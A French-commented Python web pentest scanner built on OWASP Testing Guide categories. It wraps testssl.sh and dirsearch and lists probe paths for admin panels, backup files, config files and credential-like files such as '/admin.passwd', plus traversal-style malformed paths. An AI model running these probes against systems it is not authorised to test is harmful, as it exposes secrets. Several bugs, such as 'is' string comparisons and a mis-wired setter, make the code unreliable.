#/usr/bin/python3.7

import sys
import os
import nmap
import requests
import re
import urllib3

from termcolor import colored, cprint

import argparse
from bs4 import BeautifulSoup
import shodan
import threading
import shlex
import subprocess



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print_http_info = lambda x: cprint("\t"+x, 'blue', attrs=['concealed'])
print_http_succes = lambda x: cprint("\t"+x, 'green', attrs=['bold','concealed'])
print_http_redirect = lambda x: cprint("\t"+x, 'magenta', attrs=['concealed'])
print_http_erreur_client = lambda x: cprint("\t"+x, 'red', attrs=['concealed'])
print_http_erreur_serveur = lambda x: cprint("\t"+x, 'white', attrs=['bold','concealed'])


print_red = lambda x: cprint("[-]\t"+x, 'red', attrs=['concealed'])
print_green = lambda x: cprint("[+]\t"+x, 'green', attrs=['concealed'])
print_cyan = lambda x: cprint("[i] "+x, 'cyan', attrs=['concealed'])


print_banniere = lambda x: cprint("\t\t\t"+x, 'cyan', attrs=['dark'])
print_outil= lambda x: cprint(x, 'yellow', attrs=['concealed'])
print_info= lambda x: cprint(x, 'cyan', attrs=['concealed'])
print_action= lambda x: cprint("[i] "+x, 'cyan', attrs=['bold'])
print_domaine= lambda x: cprint("\n                        ["+x+"]                        \n", 'white','on_blue', attrs=['bold','concealed'])



def requeteHTTP(requete,fichier,err=0):
     sortie = ""
     r = requests.get(requete+str(fichier)) 
     if r.status_code > 99 and r.status_code < 200 :
          print_http_info("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
     elif r.status_code > 199 and r.status_code < 300 :
          print_http_succes("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
          if err is 0:
            sortie = sortie + requete+str(fichier) + " accessible ; "
     elif r.status_code > 299 and r.status_code < 400 :
          print_http_redirect("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
     elif r.status_code > 399 and r.status_code < 500 :
          print_http_erreur_client("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
     elif r.status_code > 499 and r.status_code < 600 : 
          print_http_erreur_serveur("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
          if err is 1:
              sortie = sortie + requete+str(fichier) + " accessible ; "
     else:
          print_red("Statut Inconnu : "+str(r.status_code)+" - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))

     return sortie

def requeteHTTPS(requete,fichier, err=0):
     sortie = ""
     r = requests.get(requete+str(fichier),verify=False)   
     if r.status_code > 99 and r.status_code < 200 :
          print_http_info("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
     elif r.status_code > 199 and r.status_code < 300 :
          print_http_succes("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
          if err is 0:
            sortie = sortie + requete+str(fichier) + " accessible ; "
     elif r.status_code > 299 and r.status_code < 400 :
          print_http_redirect("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
     elif r.status_code > 399 and r.status_code < 500 :
          print_http_erreur_client("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
     elif r.status_code > 499 and r.status_code < 600 : 
          print_http_erreur_serveur("["+str(r.status_code)+"] - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
          if err is 1:
            sortie = sortie + requete+str(fichier) + " accessible ; "
     else:
          print_red("Statut Inconnu : "+str(r.status_code)+" - "+requete+str(fichier)+" - Taille : "+str(len(r.content)))
     
     return sortie

def banniere(otg):
     print_banniere("********************************")
     print_banniere("*         "+otg+"         *")
     print_banniere("********************************")

def banniereBig(otg):
     print_banniere("**************************************************")
     print_banniere("*                  "+otg+"                    *")
     print_banniere("**************************************************")

def objectif():
     print_info("\n----- [Quel est l'objectif?] -----\n")

def test():
     print_info("\n----- [Comment tester?] -----\n")

def outil():
     print_outil("\n----- [OUTIL] -----\n")     

def conclusion():
     print_info("\n----- [Comment conclure?] -----\n")


##Multiprocessing 
def checkSSL(name):
    cmd = ["/opt/testssl.sh/testssl.sh",name]
    print_action("Lancement de la commande \""+cmd[0]+"\" associée au nom "+cmd[1]+" ...")
    print_green("Ecriture dans le fichier : "+os.getcwd()+"testssl-"+cmd[1])

    with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) as p, \
        open(os.getcwd()+"/testssl-"+cmd[1], 'ab') as file:
        for line in p.stdout: # b'\n'-separated lines
            sys.stdout.buffer.write(line) # pass bytes as is
            file.write(line)

    print_green("Fin de l'écriture du fichier : "+os.getcwd()+"/testssl-"+name)

    '''with Popen(shlex.split(cmd), stdout=PIPE, stderr=STDOUT, bufsize=1) as p:
            with open("testssl-"+name, 'wb') as logfile:
                for line in p.stdout:
                    logfile.write(line)
                    sys.stdout.buffer.write(line)
                    sys.stdout.buffer.flush()'''

def checkDirectories(lien,nb_threads):
    cmd =["/opt/dirsearch/dirsearch.py","-u",lien," -r -b -e ~,doc,docx,pdf,php,xls,xlsx,rtf,odt,psw,ppt,pptx,sml,log,sql,mdb,html,htm,sh,sxw,bat,conf,config,ini,yaml,yml,txt,bak,backup,inc,js,ps,src,dev,old,inc,orig,tmp,tar,zip -x 400 -t ",nb_threads," -w /usr/share/wordlists/FinalDics/finaldic.txt"]
    print_action("Lancement de la commande \""+cmd[0]+cmd[1]+cmd[2]+cmd[3]+cmd[4]+"\" associée au lien "+lien+" ...")
    
    name_file = "dirsearch-"+lien 
    n = name_file.replace('//','-')
    n2 = n.replace(':','-')
    
    print_green("Ecriture dans le fichier : "+os.getcwd()+"/"+n2)
    with subprocess.Popen(cmd[1], stdout=subprocess.PIPE, stderr=subprocess.STDOUT) as p, \
        open(os.getcwd()+"/"+n2, 'ab') as file:
        for line in p.stdout: # b'\n'-separated lines
            sys.stdout.buffer.write(line) # pass bytes as is
            file.write(line)
            """

    with open(os.getcwd()+"/"+n2, 'wb') as logfile:
        try:
            p = subprocess.Popen(shlex.split(cmd), stdout=logfile, stderr=logfile, bufsize=1)
        except:
            pass
            """
    print_green("Fin de l'écriture du fichier "+os.getcwd()+"/"+n2)


class Service:

    def __init__(self,etat,port,name,produit):
        self.__NAME = name
        self.__ETAT = etat
        self.__PORT = port
        self.__PRODUIT = produit

    def getInfo(self):
        print_info(" ----- Service -----")
        print_info("Name :"+self.__NAME)
        print_info("Etat :"+self.__ETAT)
        print_info("Port :"+str(self.__PORT))
        print_info("Produit :"+self.__PRODUIT)
        print("\n")


class Affichage_OTG:
    def __init__(self):
        """Classe récapitulative des OTG.
    
        Chaque catégorie a un certains nombre de module.
        Pour chaque module, on détermine s'il est OK , KO ou non applicable (N/A)
        Il y a également une description qui est présente uniquement dans le cas KO

        """

        self.__OTG_INFO = { 'OTG_INFO_001':['N/A', 'DESCRIPTION'],
        'OTG_INFO_002':['N/A', 'DESCRIPTION'],
        'OTG_INFO_003':['N/A', 'DESCRIPTION'],
        'OTG_INFO_004':['N/A', 'DESCRIPTION'],
        'OTG_INFO_005':['N/A', 'DESCRIPTION'],
        'OTG_INFO_006':['N/A', 'DESCRIPTION'],
        'OTG_INFO_007':['N/A', 'DESCRIPTION'],
        'OTG_INFO_008':['N/A', 'DESCRIPTION'],
        'OTG_INFO_009':['N/A', 'DESCRIPTION'],
        'OTG_INFO_010':['N/A', 'DESCRIPTION']}

        self.__OTG_CONFIG = { 'OTG_CONFIG_001':['N/A', 'DESCRIPTION'],
        'OTG_CONFIG_002':['N/A', 'DESCRIPTION'],
        'OTG_CONFIG_003':['N/A', 'DESCRIPTION'],
        'OTG_CONFIG_004':['N/A', 'DESCRIPTION'],
        'OTG_CONFIG_005':['N/A', 'DESCRIPTION'],
        'OTG_CONFIG_006':['N/A', 'DESCRIPTION'],
        'OTG_CONFIG_007':['N/A', 'DESCRIPTION'],
        'OTG_CONFIG_008':['N/A', 'DESCRIPTION'],
        'OTG_CONFIG_009':['N/A', 'DESCRIPTION']}

        self.__OTG_IDENT = { 'OTG_IDENT_001':['N/A', 'DESCRIPTION'],
        'OTG_IDENT_002':['N/A', 'DESCRIPTION'],
        'OTG_IDENT_003':['N/A', 'DESCRIPTION'],
        'OTG_IDENT_004':['N/A', 'DESCRIPTION'],
        'OTG_IDENT_005':['N/A', 'DESCRIPTION']}

        self.__OTG_AUTHN = { 'OTG_AUTHN_001':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_002':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_003':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_004':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_005':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_006':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_007':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_008':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_009':['N/A', 'DESCRIPTION'],
        'OTG_AUTHN_010':['N/A', 'DESCRIPTION']}

        self.__OTG_AUTHZ = { 'OTG_AUTHZ_001':['N/A', 'DESCRIPTION'],
        'OTG_AUTHZ_002':['N/A', 'DESCRIPTION'],
        'OTG_AUTHZ_003':['N/A', 'DESCRIPTION'],
        'OTG_AUTHZ_004':['N/A', 'DESCRIPTION']}

        self.__OTG_SESS = { 'OTG_SESS_001':['N/A', 'DESCRIPTION'],
        'OTG_SESS_002':['N/A', 'DESCRIPTION'],
        'OTG_SESS_003':['N/A', 'DESCRIPTION'],
        'OTG_SESS_004':['N/A', 'DESCRIPTION'],
        'OTG_SESS_005':['N/A', 'DESCRIPTION'],
        'OTG_SESS_006':['N/A', 'DESCRIPTION'],
        'OTG_SESS_007':['N/A', 'DESCRIPTION'],
        'OTG_SESS_008':['N/A', 'DESCRIPTION'],
        'OTG_SESS_009':['N/A', 'DESCRIPTION'],
        'OTG_SESS_010':['N/A', 'DESCRIPTION']}

        self.__OTG_INPVAL = { 'OTG_INPVAL_001':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_002':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_003':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_004':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_005':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_006':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_007':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_008':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_009':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_011':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_012':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_013':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_014':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_015':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_016':['N/A', 'DESCRIPTION'],
        'OTG_INPVAL_017':['N/A', 'DESCRIPTION']}

        self.__OTG_ERR= { 'OTG_ERR_001':['N/A', 'DESCRIPTION'],
        'OTG_ERR_002':['N/A', 'DESCRIPTION']}

        self.__OTG_CRYPST= { 'OTG_CRYPST_001':['N/A', 'DESCRIPTION'],
        'OTG_CRYPST_002':['N/A', 'DESCRIPTION'],
        'OTG_CRYPST_003':['N/A', 'DESCRIPTION'],
        'OTG_CRYPST_004':['N/A', 'DESCRIPTION']}

        self.__OTG_BUSLOGIC= { 'OTG_BUSLOGIC_001':['N/A', 'DESCRIPTION'],
        'OTG_BUSLOGIC_002':['N/A', 'DESCRIPTION'],
        'OTG_BUSLOGIC_003':['N/A', 'DESCRIPTION'],
        'OTG_BUSLOGIC_004':['N/A', 'DESCRIPTION'],
        'OTG_BUSLOGIC_005':['N/A', 'DESCRIPTION'],
        'OTG_BUSLOGIC_006':['N/A', 'DESCRIPTION'],
        'OTG_BUSLOGIC_007':['N/A', 'DESCRIPTION'],
        'OTG_BUSLOGIC_008':['N/A', 'DESCRIPTION'],
        'OTG_BUSLOGIC_009':['N/A', 'DESCRIPTION']}

        self.__OTG_CLIENT= { 'OTG_CLIENT_001':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_002':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_003':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_004':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_005':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_006':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_007':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_008':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_009':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_010':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_011':['N/A', 'DESCRIPTION'],
        'OTG_CLIENT_012':['N/A', 'DESCRIPTION']}

        self.__RECOMMANDATION= { 'RECOMMANDATION_001':['N/A', 'DESCRIPTION'],
        'RECOMMANDATION_002':['N/A', 'DESCRIPTION']}

        
        #self.DisplayAllResults()

    def setAffichageOTG(self,name,value="N/A",description=""):

        for k,v in self.__OTG_INFO.items():
            if k is name:
                self.__OTG_INFO[k][0] = value
                self.__OTG_INFO[k][1] = description

        for k,v in self.__OTG_CONFIG.items():
            if k is name:
                self.__OTG_CONFIG[k][0] = value
                self.__OTG_CONFIG[k][1] = description

        for k,v in self.__OTG_IDENT.items():
            if k is name:
                self.__OTG_IDENT[k][0] = value
                self.__OTG_IDENT[k][1] = description

        for k,v in self.__OTG_AUTHN.items():
            if k is name:
                self.__OTG_AUTHN[k][0] = value
                self.__OTG_AUTHN[k][1] = description

        for k,v in self.__OTG_AUTHZ.items():
            if k is name:
                self.__OTG_AUTHZ[k][0] = value
                self.__OTG_AUTHZ[k][1] = description

        for k,v in self.__OTG_SESS.items():
            if k is name:
                self.__OTG_SESS[k][0] = value
                self.__OTG_SESS[k][1] = description

        for k,v in self.__OTG_INPVAL.items():
            if k is name:
                self.__OTG_INPVAL[k][0] = value
                self.__OTG_INPVAL[k][1] = description

        for k,v in self.__OTG_ERR.items():
            if k is name:
                self.__OTG_ERR[k][0] = value
                self.__OTG_ERR[k][1] = description

        for k,v in self.__OTG_CRYPST.items():
            if k is name:
                self.__OTG_CRYPST[k][0] = value
                self.__OTG_CRYPST[k][1] = description

        for k,v in self.__OTG_BUSLOGIC.items():
            if k is name:
                self.__OTG_BUSLOGIC[k][0] = value
                self.__OTG_BUSLOGIC[k][1] = description

        for k,v in self.__OTG_CRYPST.items():
            if k is name:
                self.__OTG_CLIENT[k][0] = value
                self.__OTG_CLIENT[k][1] = description

        for k,v in self.__RECOMMANDATION.items():
            if k is name:
                self.__RECOMMANDATION[k][0] = value
                self.__RECOMMANDATION[k][1] = description

    #def setOTG_INFO(num,value,description=""):
    def setOTG_INFO(self,num,value="N/A",description=""):

        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_INFO
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 10:
            print_red("OTG INFO numéro inconnu :"+str(num))
        else:
            list(self.__OTG_INFO.values())[num-1][0] = value
            list(self.__OTG_INFO.values())[num-1][1] = description         


    def setOTG_CONFIG(self,num,value,description=""):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_CONFIG
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 9:
            print_red("OTG CONFIG numéro inconnu :"+str(num))
        else:
            list(self.__OTG_CONFIG.values())[num-1][0] = value
            list(self.__OTG_CONFIG.values())[num-1][1] = description


    def setOTG_IDENT(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_IDENT
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """
        if num < 1 or num > 5:
            print_red("OTG IDENT numéro inconnu :"+str(num))
        else:
            list(self.__OTG_IDENT.values())[num-1][0] = value
            list(self.__OTG_IDENT.values())[num-1][1] = description


    def setOTG_AUTHN(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_AUTHN
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 10:
            print_red("OTG IDENT numéro inconnu :"+str(num))
        else:
            list(self.__OTG_AUTHN.values())[num-1][0] = value
            list(self.__OTG_AUTHN.values())[num-1][1] = description



    def setOTG_AUTHZ(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_AUTHZ
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 4:
            print_red("OTG AUTHZ numéro inconnu :"+str(num))
        else:
            list(self.__OTG_AUTHZ.values())[num-1][0] = value
            list(self.__OTG_AUTHZ.values())[num-1][1] = description



    def setOTG_SESS(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_INFO
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 8:
            print_red("OTG SESS numéro inconnu :"+str(num))
        else:
            list(self.__OTG_SESS.values())[num-1][0] = value
            list(self.__OTG_SESS.values())[num-1][1] = description


    def setOTG_INPVAL(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_INFO
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 17:
            print_red("OTG INPVAL numéro inconnu :"+str(num))
        else:
            list(self.__OTG_INPVAL.values())[num-1][0] = value
            list(self.__OTG_INPVAL.values())[num-1][1] = description

    def setOTG_ERR(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_INFO
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 2:
            print_red("OTG ERR numéro inconnu :"+str(num))
        else:
            list(self.__OTG_ERR.values())[num-1][0] = value
            list(self.__OTG_ERR.values())[num-1][1] = description

    def setOTG_CRYPST(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_INFO
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 4:
            print_red("OTG CRYPST numéro inconnu :"+str(num))
        else:
            list(self.__OTG_CRYPST.values())[num-1][0] = value
            list(self.__OTG_CRYPST.values())[num-1][1] = description

    def setOTG_BUSLOGIC(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_BUSLOGIC
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 9:
            print_red("OTG CRYPST numéro inconnu :"+str(num))
        else:
            list(self.__OTG_BUSLOGIC.values())[num-1][0] = value
            list(self.__OTG_BUSLOGIC.values())[num-1][1] = description




    def setOTG_CLIENT(self,num,value='N/A',description=''):
        """Setter : Permet d'assigner la valeur N/A OK ou KO à chaque OTG ;ainsi qu'une description
        
        Paramètres nommées : 
        num : numéro de module dans OTG_INFO
        value : valeur du module (OK , KO , N/A)
        description : état des lieux d'un cas KO

        Note : 1 correspond à la case numéro 0 du dictionnaire etc.
        """

        if num < 1 or num > 12:
            print_red("OTG CLIENT numéro inconnu :"+str(num))
        else:
            list(self.__OTG_CLIENT.values())[num-1][0] = value
            list(self.__OTG_CLIENT.values())[num-1][1] = description


    def DisplayAllResults(self):

        banniere("OTG_INFO")
        for key in self.__OTG_INFO:
            if self.__OTG_INFO[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_INFO[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_INFO[key][1])
            elif self.__OTG_INFO[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG_CONFIG")
        for key in self.__OTG_CONFIG:
            if self.__OTG_CONFIG[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_CONFIG[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_CONFIG[key][1])
            elif self.__OTG_CONFIG[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG IDENT")
        for key in self.__OTG_IDENT:
            if self.__OTG_IDENT[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_IDENT[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_IDENT[key][1])
            elif self.__OTG_IDENT[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG AUTHN")
        for key in self.__OTG_AUTHN:
            if self.__OTG_AUTHN[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_AUTHN[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_AUTHN[key][1])
            elif self.__OTG_AUTHN[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG AUTHZ")
        for key in self.__OTG_AUTHZ:
            if self.__OTG_AUTHZ[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_AUTHZ[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_AUTHZ[key][1])
            elif self.__OTG_AUTHZ[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG SESS")
        for key in self.__OTG_SESS:
            if self.__OTG_SESS[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_SESS[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_SESS[key][1])
            elif self.__OTG_SESS[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG INPVAL")
        for key in self.__OTG_INPVAL:
            if self.__OTG_INPVAL[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_INPVAL[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_INPVAL[key][1])
            elif self.__OTG_INPVAL[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG ERR")
        for key in self.__OTG_ERR:
            if self.__OTG_ERR[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_ERR[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_ERR[key][1])
            elif self.__OTG_ERR[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG CRYPST")
        for key in self.__OTG_CRYPST:
            if self.__OTG_CRYPST[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_CRYPST[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_CRYPST[key][1])
            elif self.__OTG_CRYPST[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG BUSLOGIC")
        for key in self.__OTG_BUSLOGIC:
            if self.__OTG_BUSLOGIC[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_BUSLOGIC[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_BUSLOGIC[key][1])
            elif self.__OTG_BUSLOGIC[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))

        banniere("OTG CLIENT")
        for key in self.__OTG_CLIENT:
            if self.__OTG_CLIENT[key][0] is "OK":
                print(key+" : "+colored('OK','green'))
            elif self.__OTG_CLIENT[key][0] is "KO":
                print(key+" : "+colored('KO','red')+" - "+self.__OTG_CLIENT[key][1])
            elif self.__OTG_CLIENT[key][0] is "N/A":
                print(key+" : "+colored('N/A','white'))
            else:
                print(key+" : "+colored('N/A','white'))      






class OTG:
    """ """
    def __init__(self,domains):
        self.__AllDomains=domains

        #En tête pour la détermination du serveur
        self.__HTTPSERVERHEADERS=["Server","Via","X-Powered-By"]

        ##Search sensitives comments
        self.__SENSITIVES_COMMENTS=["Base de donnée","database","mot de passe","password","admin","confidentiel","secret","nom de compte"]
        ## Search in page
        self.__FRAMEWORKS=["Zope","CakePHP","Kohana","Laravel","Adobe","Coldfusion","Microsoft","ASP.NET","ZK","Business","Catalyst","Indexhibit"]
        self.__APPLICATIONS=["phpBB","Wordpress","Mediawiki","Joomla","Drupal","1C-Bitrix","AMPcms","Django","DotNetNuke","e107","EPiServer","Graffiti","CMS","Hotaru","ImpressCMS","Indico","InstantCMS","Kentico","MODx","TYPO3","Dynamicweb","LEPTON","Wix","VIVVO"]


        ##Search in monsite.com/
        self.__ASP_CONFIGS=["/machine.config","/web.config"]
        self.__IIS_CONFIGS=["/applicationHost.config","/redirection.config","/administration.config"]
        self.__RECOVERY_FILES=["/file","/file.old","/login.asp.old",
        "/index.php~","/index.php.old","/config.php~",
         "/login.php~","/uploadfile.jsp","/.snapshot",
         "/viewuser.asp","/edituser.asp","/adduser.asp","/deleteuser.asp",
         "/app/user","/app/admin","/admin/useradmin.jsp",
         "/backup","/backups","/include","/forgotPassword.jsp"]

        self.__ADMIN_INTERFACES=["/admin","/admin-authz.xml","/admin.conf",
         "/admin.passwd","/admin/*","/admin/logon.jsp",
         "/admin/secure/logon.jsp","/phpinfo","/phpmyadmin/",
         "/phpMyAdmin/","/mysqladmin/","/MySQLadmin","/MySQLAdmin",
         "/login.php","/logon.php","/xmlrpc.php","/dbadmin",
         "/admin.dll","/admin.exe","/administrators.pwd","/author.dll","/author.exe",
         "/author.log","/authors.pwd","/cgi-bin","/AdminCaptureRootCA","/AdminClients",
         "/AdminConnections","/AdminEvents","/AdminJDBC","/AdminLicense","/wp-admin/",
         "/wp-admin/about.php","/wp-admin/admin-ajax.php","/wp-admin/admin-db.php",
         "/wp-admin/admin-footer.php","/wp-admin/admin-functions.php",
         "/wp-admin/admin-header.php","/AdminMain","/AdminProps","/AdminRealm",
         "/AdminThreads"]

        self.__CORS=["/crossdomain.xml","/clientaccesspolicy.xml"]

        self.__MALFORMED_CARACS=["/'",'/*','/~%','/~%~','/\%0d\%0a','/%20','/%20%20../']

        self.__DESCRIPTEUR=["/web.xml","/WEB-INF/"]

        ##Methodes HTTP
        self.__METHODS=["OPTIONS","GET","HEAD","POST","PUT","DELETE","TRACE","CONNECT","PROPFIND","PROPPATCH","MKCOL","COPY","MOVE","LOCK","UNLOCK"]

        self.__JAVASCRIPT_CHARTING_LIBRAIRIES=["amCharts","AnyChart","ApexCharts","billboard.js","C3.js",
        "CanvasJS","canvasXpress","Chartist","Chart.js","Charts 4 PHP","Cytoscape.js","D3.js","DevExtreme",
        "DHTMLX Charts","dimple ","Dojo Charting","Dygraphs ","Echarts","Factmint Charts","Flot Charts","FusionCharts",
        "Flotr2 ","MuzeJS","LightningChart JS","Google Charts","FusionCharts","Highcharts","Highstock","JenScript",
        "jqPlot","jqxChart","JSCharting","KoolChart","MetricsGraphics","NextCharts","NVD3","OLAPCharts",
        "plotly.js","PlusCharts","ReactiveChart","RGraph","rickshaw","Shield UI ","Syncfusion","TeeChart JS","Vaadin Charts",
        "VanCharts","VisJS ","Webcharts","Webix JS Charts","xcharts","YUI Charts","ZingChart","ZoomCharts"]

        self.__JAVASCRIPT_LIBRAIRIES=["Cassowary","CHR.js","Google Polymer","Dojo","jQuery",
        "midori","Prototype JavaScript Framework","Chart.js","D3.js","FusionCharts","Highcharts","infoVis","p5.js","Plotly",
        "Processing.js","RGraph","SWFObject","Teechart","Three.js","Velocity.js","Verge3D","Raphaël",
        "Angular","AngularJS","Bootstrap","Dojo Widgets","Ext JS","Foundation","jQuery UI","jQWidgets","OpenUI5",
        "Polymer","qooxdoo","React.js","SmartClient","Vue.js","Webix","WinJS","Svelte","Glow",
        "Lively Kernel","script.aculo.us","YUI Library","Google Closure Library","Joose","JsPHP","Microsoft's Ajax library",
        "MochiKit","PDF.js","Rico","Socket.IO","Spry framework","Underscore.js","Cascade Framework","jQuery Mobile","Mustache",
        "Jinja-JS","Twig.js","Jasmine","Mocha","QUnit","Unit.js"]
